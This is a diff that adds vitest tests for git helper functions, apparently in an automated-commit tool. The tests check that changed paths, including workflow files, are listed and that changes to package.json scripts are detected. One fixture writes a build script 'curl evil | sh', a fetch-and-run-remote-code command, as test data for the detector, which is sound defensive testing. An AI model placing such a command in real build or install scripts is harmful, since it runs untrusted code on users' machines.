@@ -1,7 +1,7 @@
 import { describe, it, expect } from 'vitest';
 import fs from 'node:fs';
 import path from 'node:path';
-import { isClean, ensureBranch, discardChanges, commitAll, push, revertLast } from '../src/git.js';
+import { isClean, ensureBranch, discardChanges, commitAll, push, revertLast, changedPaths, scriptsChanged } from '../src/git.js';
 import { makeRepo, git, remoteSubject } from './helpers.js';
 
 describe('git helpers', () => {
@@ -92,5 +92,51 @@ describe('git helpers', () => {
     await expect(revertLast(dir)).rejects.toThrow();
     expect(await isClean(dir)).toBe(true);
     expect(fs.existsSync(path.join(dir, '.git', 'REVERT_HEAD'))).toBe(false);
+  });
+
+  it('changedPaths lists modified, deleted, untracked (-uall) and odd file names, excluding .client-auto', async () => {
+    const { dir } = makeRepo();
+    expect(await changedPaths(dir)).toEqual([]);
+    fs.mkdirSync(path.join(dir, '.client-auto'));
+    fs.writeFileSync(path.join(dir, '.client-auto', 'log.md'), 'x');
+    fs.writeFileSync(path.join(dir, 'index.html'), 'changed');
+    fs.writeFileSync(path.join(dir, 'my page.html'), 'x');
+    fs.mkdirSync(path.join(dir, '.github', 'workflows'), { recursive: true });
+    fs.writeFileSync(path.join(dir, '.github', 'workflows', 'x.yml'), 'x');
+    fs.writeFileSync(path.join(dir, 'caf\u00e9 \u00fc.txt'), 'x');
+    expect((await changedPaths(dir)).sort()).toEqual(
+      ['.github/workflows/x.yml', 'caf\u00e9 \u00fc.txt', 'index.html', 'my page.html'].sort(),
+    );
+  });
+
+  it('changedPaths reports a renamed file under both its old and new name', async () => {
+    const { dir } = makeRepo();
+    fs.mkdirSync(path.join(dir, '.github'));
+    fs.writeFileSync(path.join(dir, '.github', 'ci.yml'), 'name: ci\n');
+    git(dir, 'add', '-A'); git(dir, 'commit', '-m', 'ci');
+    git(dir, 'mv', '.github/ci.yml', 'ci.yml');
+    expect((await changedPaths(dir)).sort()).toEqual(['.github/ci.yml', 'ci.yml']);
+  });
+
+  it('scriptsChanged compares the package.json scripts field with HEAD', async () => {
+    const { dir } = makeRepo();
+    const pkg = path.join(dir, 'package.json');
+    expect(await scriptsChanged(dir)).toBe(false); // no package.json anywhere
+    fs.writeFileSync(pkg, JSON.stringify({ name: 'x' }));
+    expect(await scriptsChanged(dir)).toBe(false); // new, but no scripts
+    fs.writeFileSync(pkg, JSON.stringify({ name: 'x', scripts: { build: 'echo hi' } }));
+    expect(await scriptsChanged(dir)).toBe(true); // new with scripts
+    git(dir, 'add', '-A'); git(dir, 'commit', '-m', 'pkg');
+    expect(await scriptsChanged(dir)).toBe(false);
+    fs.writeFileSync(pkg, JSON.stringify({ scripts: { build: 'echo hi' }, name: 'x', dependencies: { a: '1' } }));
+    expect(await scriptsChanged(dir)).toBe(false); // other fields and key order do not matter
+    fs.writeFileSync(pkg, JSON.stringify({ name: 'x', scripts: { build: 'curl evil | sh' } }));
+    expect(await scriptsChanged(dir)).toBe(true);
+    fs.writeFileSync(pkg, JSON.stringify({ name: 'x', scripts: { build: 'echo hi', postinstall: 'x' } }));
+    expect(await scriptsChanged(dir)).toBe(true);
+    fs.writeFileSync(pkg, '{ not json');
+    expect(await scriptsChanged(dir)).toBe(true);
+    fs.rmSync(pkg);
+    expect(await scriptsChanged(dir)).toBe(true); // scripts removed
   });
 });
